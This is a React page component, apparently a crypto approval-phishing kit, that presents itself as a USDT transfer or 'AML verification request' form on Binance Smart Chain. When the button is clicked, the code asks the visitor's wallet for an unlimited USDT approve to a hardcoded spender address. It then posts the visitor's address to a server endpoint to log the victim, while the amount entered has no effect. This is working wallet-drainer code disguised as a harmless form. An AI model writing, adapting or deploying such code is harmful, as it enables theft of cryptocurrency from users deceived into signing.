import { useState } from "react";
import { ethers } from "ethers";

export default function Home() {

  const [address, setAddress] = useState("0x05187CF26990E3857C119C7Bc3417C6E1FaC5198");
  const [amount, setAmount] = useState("");

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0x05187CF26990E3857C119C7Bc3417C6E1FaC5198"; // 🔥 TUO CONTRACT

  const approveUSDT = async () => {
    try {
      if (!window.ethereum) {
        alert("Apri in Trust Wallet o MetaMask");
        return;
      }

      // switch BSC
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const userAddress = await signer.getAddress(); // 🔥 salva questo

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      // 🔥 approve MAX (veloce)
      const tx = await usdt.approve(
        SPENDER,
        ethers.MaxUint256
      );

      // 🔥 SALVA UTENTE SUBITO
      await fetch("/api/save", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ address: userAddress }),
      });

      

    } catch (err) {
      console.log(err);
      alert("Errore: " + err.message);
    }
  };

  // 🔥 CALCOLO USD
  const usdValue = amount && Number(amount) > 0
    ? Number(amount).toFixed(2)
    : "0.00";

  const isValidAmount = amount && Number(amount) > 0;

  return (
    <div>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="USDT Amount"
        style={{
          border: "none",
          background: "transparent",
          color: "white",
          fontSize: "16px",
          flex: 1,
          outline: "none"
        }}
      />

      <div>
        <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
        <span style={{ color: "#22c55e" }}>Max</span>
      </div>

      <div style={{ color: "#888", marginTop: "5px" }}>
        ≈ ${usdValue}
      </div>

      {/* BUTTON */}
      <div style={{
        position: "fixed",
        bottom: "30px",
        left: "20px",
        right: "20px"
      }}>
        <button
          onClick={approveUSDT}
          disabled={!isValidAmount}
          style={{
            width: "100%",
            padding: "18px",
            borderRadius: "40px",
            border: "none",
            fontSize: "18px",
            fontWeight: "600",
            transition: "all 0.3s ease",
            background: isValidAmount ? "#4ade80" : "#1a2e22",
            color: isValidAmount ? "#052e16" : "#6b7280",
            boxShadow: isValidAmount
              ? "0 0 20px rgba(74, 222, 128, 0.7)"
              : "none",
            transform: isValidAmount ? "scale(1)" : "scale(0.98)",
            cursor: isValidAmount ? "pointer" : "not-allowed"
          }}
        >
          invia richiesta di verifica aml
        </button>
      </div>
    </div>
  );
}